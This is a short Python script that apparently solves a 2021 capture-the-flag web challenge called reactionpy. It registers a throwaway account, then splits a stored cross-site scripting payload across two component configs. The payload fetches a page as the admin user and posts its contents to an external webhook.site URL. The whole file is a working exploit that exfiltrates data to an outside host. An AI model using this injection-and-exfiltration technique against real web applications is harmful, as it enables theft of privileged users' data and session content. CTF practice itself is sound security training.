#!/usr/bin/env python3

import requests
import secrets

url = 'https://reactionpy.2021.chall.actf.co/'
s = requests.Session()

s.get(url + 'register', )

data = {
    'username': secrets.token_hex(7),
    'pw': secrets.token_hex(7)
}

s.post(url + 'register', data=data)
s.post(url + 'reset')

data = {
    'name': 'freq',
    'cfg': '<script>/*'
}

r = s.post(url + 'newcomp', data=data)

data = {
    'name': 'text',
    'cfg': '*/ fetch(`/?fakeuser=admin`).then(function(r){return r.text()}).then(function(body){fetch(`https://webhook.site/c7c327b2-81ef-4267-880f-be92a5b57387`,{method:`POST`,body})})//'
}

r = s.post(url + 'newcomp', data=data)
print(s.cookies.get_dict())